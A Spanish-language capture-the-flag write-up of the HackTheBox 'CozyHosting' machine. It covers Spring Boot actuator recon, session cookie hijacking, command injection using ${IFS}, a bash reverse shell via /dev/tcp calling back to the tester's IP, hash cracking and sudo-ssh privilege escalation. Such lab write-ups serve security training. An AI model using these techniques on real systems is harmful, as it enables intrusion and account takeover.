---
title: "CozyHosting Write-Up - HackTheBox"
description: "CozyHosting Write-Up - HackTheBox"
pubDatetime: 2023-09-04
tags: ["fácil", "htb", "spring", "cracking", "postgresql"]
---

# Reconocimiento

Comenzamos con un escaneo básico de `nmap`.

```bash
❯ nmap 10.10.11.230
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 09:31 CEST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 52.17 seconds
```

Tenemos SSH y un servicio web.

## Reconocimiento web

![](@assets/HackTheBox/CozyHosting/web.png)

Tras un rato fuzzeando con `gobuster` no encuentro nada interesante más que un panel de login para el que no tenemos credenciales. Hasta que usando `dirsearch` doy con algo de interés.

```bash
❯ dirsearch -u 'http://cozyhosting.htb'

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11714

Task Completed

200     5KB  http://cozyhosting.htb/actuator/env
200    15B   http://cozyhosting.htb/actuator/health
200   148B   http://cozyhosting.htb/actuator/sessions
200    10KB  http://cozyhosting.htb/actuator/mappings
200   124KB  http://cozyhosting.htb/actuator/beans
401    97B   http://cozyhosting.htb/admin
500    73B   http://cozyhosting.htb/error
```

Una ruta `/actuator` que con una simple búsqueda encuentro que posiblemente nos enfrentemos a un [**Spring Boot**](https://luiscualquiera.medium.com/qu%C3%A9-son-los-actuators-de-spring-boot-55cecb48f746).

> También podíamos intuir que estábamos ante un **Spring Boot** debido al mensaje de error "Whitelabel Error Page", típico de este tipo de framework.

Spring es un conjunto de frameworks para el desarrollo de aplicaciones en Java y una funcionalidad interesante que tienen son los **actuators**.

Los **actuators** exponen información sobre la aplicación Spring en ejecución a través de (entre otros) una API REST y pueden utilizarse para recuperar datos del sistema, o incluso realizar cambios de configuración si se configuran incorrectamente.

Para ver los endpoints disponibles simplemente hay que hacer una petición a `/actuator`.

```bash
❯ curl -s cozyhosting.htb/actuator | jq
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health-path": {
      "href": "http://localhost:8080/actuator/health/{*path}",
      "templated": true
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://localhost:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```

### Cookie hijacking

Me llama la atención el `/actuator/sessions` donde viendo su contenido vemos lo que parecen cookies de sesión. Entre las que vemos una de un supuesto usuario **kanderson**.

```bash
❯ curl -s cozyhosting.htb/actuator/sessions | jq
{
  "9C4CD4D3895BC2FBE63D263C100F3BB7": "kanderson"
}
```

Nos copiamos la cookie, la introducimos en el navegador y podemos acceder al panel en `/admin` reutilizando la cookie de sesión.

![](@assets/HackTheBox/CozyHosting/admin.png)

### Inyección de comandos e intrusión

En esta página hay una funcionalidad para conectarse por SSH remotamente proporcionando un host y un usuario.

![](@assets/HackTheBox/CozyHosting/ssh.png)

Vemos que al mandar una petición con el usuario vacío nos devuelve el siguiente error:

![](@assets/HackTheBox/CozyHosting/ssh_error.png)

Lo que me hacer pensar en una inyección de comandos.

![](@assets/HackTheBox/CozyHosting/ci.png)

Parece que lo está ejecutando así que intento una reverse shell.

> Como la aplicación no deja escribir espacios, hay que hacer uso de `${IFS}`, una variable de entorno de bash que básicamente actua como separador.

Para conseguir la reverse shell lo que to hice (hay muchas formas) fue hostear un archivo `shell.sh` en local.

```bash
❯ echo "#!/bin/bash" > shell.sh
❯ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.54/443 0>&1'" >> shell.sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y como tengo conectividad con la máquina, ponerme en escucha e inyectar el siguiente comando.

![](@assets/HackTheBox/CozyHosting/revshell.png)

Tenemos shell como el usuario app.

![](@assets/HackTheBox/CozyHosting/app.png)

# Movimiento lateral

Vemos en el directorio `/app` un archivo `cloudhosting-0.0.1.jar`, nos lo traemos a un directorio con permisos de escritura y lo descomprimimos para ver los contenidos con detalle.

![](@assets/HackTheBox/CozyHosting/jar.png)

Encuentro un archivo `BOOT-INF/classes/application.properties` con credenciales para una base de datos `PostgreSQL`.

![](@assets/HackTheBox/CozyHosting/psql.png)

![](@assets/HackTheBox/CozyHosting/connect.png)

Me conecto a la base de datos **cozyhosting** y listamos la tabla **users**.

![](@assets/HackTheBox/CozyHosting/database.png)

Hay hashes para los usuarios **admin** y **kanderson**.

Crackeandolos con john, consigo crackear uno.

```bash
❯ john -w:/usr/share/seclists/rockyou.txt hashes
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
```

Pero en el sistema no existe ningún usuario **admin** o **kanderson**. Por lo que pruebo a reutilizar la contraseña para el usuario **josh**.

Tenemos shell como el usuario **josh** y la primera flag.

![](@assets/HackTheBox/CozyHosting/user.png)

# Escalada de privilegios

Como este usuario podemos ejecutar `/usr/bin/ssh` como root.

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

En [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) hay un simple payload para obtener una shell como root. Lo ejecutamos y tenemos shell como root.

![](@assets/HackTheBox/CozyHosting/root.png)

# Referencias

- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
- [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)
- [https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces)
